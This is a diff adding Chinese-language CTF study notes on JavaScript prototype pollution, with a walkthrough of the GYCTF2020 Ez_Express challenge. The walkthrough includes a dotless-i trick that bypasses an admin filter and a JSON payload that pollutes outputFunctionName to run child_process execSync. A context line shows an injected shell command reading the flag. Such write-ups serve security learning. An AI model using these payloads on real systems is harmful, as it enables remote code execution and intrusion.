@@ -6629,3 +6629,117 @@ file "";head /fla*;"" ;
     2. getimagesize函数返回图片信息，第三个元素不能等于IMAGETYPE_PNG，也就是不能为3，因此我们需要绕过这个函数
 
     要修改图片信息，可以用001editor打开图片，第一个函数是通过文件头来判断的，第二个函数是通过读取后面的内容来判断的，所以我们可以保留图片的文件头，而删掉除了文件头以外的其他信息(最方便)，或者是把其他信息改一下(暂时没有尝试)然后上传，最终就得到了flag。
+
+## JS 原型链污染
+
+[P神原型链污染](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)
+
+1. 原型链概念
+
+    在 Javascript，每一个实例对象都有一个prototype属性，prototype 属性
+
+    可以向对象添加属性和方法。
+
+    ```javascript
+    object.prototype.name=value
+    ```
+
+    在 Javascript，每一个实例对象都有一个__proto__属性，这个实例属性 指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对 象的原型对象：
+
+    ```javascript
+    objectname["__proto__"]
+
+    objectname.__proto__
+
+    objectname.constructor.prototype
+    ```
+
+2. 污染原理
+
+    object[a][b] = value 如果可以控制a、b、value的值，将a设置为 proto，我们就可以给object对象的原型设置一个b属性，值为value。这样 所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b 属性，且值为value。
+
+### GYCTF2020 Ez_Express
+
+1. 见到登录框，测试了一下sql注入，没什么反应；试一下robots.txt, 404；又试了一下www.zip,发现了源码，是js。
+2. js接触不多，到这只能看wp
+
+    >关键源码在app.js和index.js中，直接开始代码审计吧
+    /route/index.js中用了merge()和clone()，必是原型链的问题了
+
+    >思路：js审计如果看见merge，clone函数，可以往原型链污染靠，跟进找一下关键的函数，找污染点
+    切记一定要让其__proto__解析为一个键名
+
+3. 在index.js种发现了漏洞
+
+    ```javascript
+    const merge = (a, b) => {
+    for (var attr in b) {
+        if (isObject(a[attr]) && isObject(b[attr])) {
+        merge(a[attr], b[attr]);
+        } else {
+        a[attr] = b[attr];
+        }
+    }
+    return a
+    }
+    const clone = (a) => {
+    return merge({}, a);
+    }
+    ```
+
+    往下在`/action`的路由中找到`clone()`的位置
+
+    ```javascript
+    router.post('/action', function (req, res) {
+    if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
+    req.session.user.data = clone(req.body);
+    res.end("<script>alert('success');history.go(-1);</script>");  
+    });
+    ```
+
+    需要ADMIN账号才能用到clone()
+
+    于是去看/login路由的源码，主要看注册时对用户名的判断
+
+    ```javascript
+    if(safeKeyword(req.body.userid)){
+    res.end("<script>alert('forbid word');history.go(-1);</script>") 
+   }
+    ```
+
+    safeKeyword函数
+
+    ```javascript
+    function safeKeyword(keyword) {
+        if(keyword.match(/(admin)/is)) {
+            return keyword
+        }
+    }
+    ```
+
+    这里是通过正则来过滤掉admin(大小写)，不过有个地方可以注意到`'user':req.body.userid.toUpperCase()`
+    这里用`toUpperCase`将user给转为大写了，这种转编码的通常都很容易出问题
+
+    [P神javascript大小写特性](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
+
+    注册payload: `admın`
+
+    ```javascript
+    router.get('/info', function (req, res) {
+        res.render('index',data={'user':res.outputFunctionName});
+    })
+    ```
+
+    可以看到在`/info`下，使用将`outputFunctionName`渲染入`index`中，而`outputFunctionName`是未定义的
+
+    `res.outputFunctionName=undefined;`
+
+    也就是可以通过污染`outputFunctionName`进行SSTI
+
+    于是抓`/action`的包，Content-Type设为`application/json`
+
+    payload:
+    ```json
+    {"lua":"a","__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"},"Submit":""}
+    ```
+    再访问`/info`就可以下载到flag文件
